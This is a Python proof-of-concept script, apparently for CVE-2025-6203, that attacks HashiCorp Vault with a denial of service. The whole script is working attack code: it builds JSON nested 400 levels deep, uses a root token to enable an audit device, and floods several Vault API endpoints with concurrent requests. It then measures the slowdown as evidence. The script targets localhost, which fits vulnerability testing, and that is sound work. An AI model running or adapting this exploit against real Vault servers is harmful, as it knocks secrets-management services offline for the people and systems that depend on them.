#!/usr/bin/env python3
import requests
import json
import time
import sys
import concurrent.futures

TARGET = "http://localhost:8200"
TOKEN = "root"
NESTING_DEPTH = 400
CONCURRENT_WORKERS = 20
REQUESTS_PER_WORKER = 10

def create_nested_json(depth):
    result = {"value": "A" * 5000}
    for _ in range(depth):
        result = {
            "nested": result,
            "array": [{"k": f"v{i}" * 20, "m": {"x": "y" * 50}} for i in range(40)],
            "data": {"u": "X" * 30, "d": "Y" * 40, "t": [f"z{j}" * 15 for j in range(25)]}
        }
    return result

def enable_audit():
    headers = {"X-Vault-Token": TOKEN}
    try:
        r = requests.post(
            f"{TARGET}/v1/sys/audit/file",
            headers=headers,
            json={"type": "file", "options": {"file_path": "stdout"}},
            timeout=5
        )
        return r.status_code in [200, 204, 400]
    except:
        return False

def send_request(payload, worker_id, request_id):
    headers = {"X-Vault-Token": TOKEN}
    endpoints = [
        "/v1/sys/raw/test",
        "/v1/sys/wrapping/wrap",
        "/v1/secret/data/test",
        "/v1/auth/token/lookup-self"
    ]
    endpoint = endpoints[(worker_id + request_id) % len(endpoints)]
    try:
        start = time.time()
        r = requests.post(f"{TARGET}{endpoint}", headers=headers, json=payload, timeout=60)
        return {"status": r.status_code, "duration": time.time() - start, "error": None}
    except requests.exceptions.Timeout:
        return {"status": None, "duration": 60, "error": "TIMEOUT"}
    except requests.exceptions.ConnectionError:
        return {"status": None, "duration": 0, "error": "CONNECTION_ERROR"}
    except Exception as e:
        return {"status": None, "duration": 0, "error": str(e)[:50]}

def test_vulnerability():
    print("=" * 70)
    print("CVE-2025-6203: HashiCorp Vault JSON DoS PoC")
    print("=" * 70)
    
    print("\n[*] Testing Vault service connectivity...")
    try:
        r = requests.get(f"{TARGET}/v1/sys/health", timeout=5)
        print(f"[+] Vault service running (HTTP {r.status_code})")
        version = r.json().get('version', 'Unknown')
        print(f"    Version: {version}")
    except Exception as e:
        print(f"[-] Cannot connect to Vault: {e}")
        return False
    
    print("\n[*] Enabling audit device (stdout)...")
    if enable_audit():
        print("[+] Audit device enabled")
    else:
        print("[*] Audit device may already be enabled or failed")
    
    print("\n[*] Measuring baseline response time...")
    baseline_times = []
    for _ in range(5):
        start = time.time()
        requests.get(f"{TARGET}/v1/sys/health", timeout=5)
        baseline_times.append(time.time() - start)
    avg_baseline = sum(baseline_times) / len(baseline_times)
    print(f"    Average: {avg_baseline:.4f}s")
    
    print(f"\n[*] Creating nested JSON payload (depth: {NESTING_DEPTH})...")
    malicious_payload = create_nested_json(NESTING_DEPTH)
    payload_size = len(json.dumps(malicious_payload))
    print(f"    Size: {payload_size:,} bytes ({payload_size/1024/1024:.2f} MB)")
    
    total = CONCURRENT_WORKERS * REQUESTS_PER_WORKER
    print(f"\n[*] Sending DoS attack ({CONCURRENT_WORKERS} workers x {REQUESTS_PER_WORKER} = {total} requests)...")
    
    start_time = time.time()
    results = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENT_WORKERS) as executor:
        futures = []
        for w in range(CONCURRENT_WORKERS):
            for r in range(REQUESTS_PER_WORKER):
                futures.append(executor.submit(send_request, malicious_payload, w, r))
        
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            result = future.result()
            results.append(result)
            if result["error"]:
                print(f"    [{i+1}/{total}] {result['error']} | Duration: {result['duration']:.2f}s")
            elif i % 20 == 0:
                print(f"    [{i+1}/{total}] HTTP {result['status']} | Duration: {result['duration']:.2f}s")
    
    attack_duration = time.time() - start_time
    
    print("\n[*] Checking service status...")
    time.sleep(2)
    
    service_alive = True
    try:
        r = requests.get(f"{TARGET}/v1/sys/health", timeout=30)
        resp_time = r.elapsed.total_seconds()
        print(f"    Service responding (time: {resp_time:.3f}s)")
    except:
        service_alive = False
        print(f"    Service NOT responding!")
    
    print("\n[*] Measuring post-attack response time...")
    final_times = []
    for _ in range(5):
        try:
            start = time.time()
            requests.get(f"{TARGET}/v1/sys/health", timeout=30)
            final_times.append(time.time() - start)
        except:
            final_times.append(30.0)
    avg_final = sum(final_times) / len(final_times) if final_times else 30.0
    degradation = ((avg_final - avg_baseline) / avg_baseline) * 100 if avg_baseline > 0 else 0
    print(f"    Average: {avg_final:.4f}s (change: {degradation:+.1f}%)")
    
    timeouts = sum(1 for r in results if r["error"] == "TIMEOUT")
    conn_err = sum(1 for r in results if r["error"] == "CONNECTION_ERROR")
    slow = sum(1 for r in results if r["duration"] > 3)
    durations = [r["duration"] for r in results if r["duration"] > 0]
    avg_dur = sum(durations) / len(durations) if durations else 0
    
    print("\n" + "=" * 70)
    print("Attack Statistics:")
    print(f"    Total: {total}, Timeouts: {timeouts}, Conn Errors: {conn_err}")
    print(f"    Slow (>3s): {slow}, Avg Duration: {avg_dur:.2f}s")
    print(f"    Attack Duration: {attack_duration:.2f}s")
    print("=" * 70)
    
    vulnerable = False
    evidence = []
    
    if timeouts > 0:
        vulnerable = True
        evidence.append(f"- {timeouts} requests timed out")
    if conn_err > 0:
        vulnerable = True
        evidence.append(f"- {conn_err} connection errors")
    if slow > total * 0.1:
        vulnerable = True
        evidence.append(f"- {slow} slow responses (>{slow*100//total}%)")
    if degradation > 100:
        vulnerable = True
        evidence.append(f"- Response degradation: +{degradation:.1f}%")
    if not service_alive:
        vulnerable = True
        evidence.append("- Service became unresponsive!")
    if avg_dur > 2:
        vulnerable = True
        evidence.append(f"- High avg request duration: {avg_dur:.2f}s")
    
    if vulnerable:
        print("\n[+] VULNERABLE! CVE-2025-6203 confirmed")
        print("\nEvidence:")
        for e in evidence:
            print(f"  {e}")
        print("\nConclusion:")
        print("  Vault 1.20.2 lacks JSON complexity limits")
        print("  Complex payloads cause resource exhaustion")
        return True
    else:
        print("\n[-] Vulnerability not triggered")
        return False

if __name__ == "__main__":
    try:
        result = test_vulnerability()
        sys.exit(0 if result else 1)
    except KeyboardInterrupt:
        print("\n\nInterrupted")
        sys.exit(1)
    except Exception as e:
        print(f"\nFailed: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
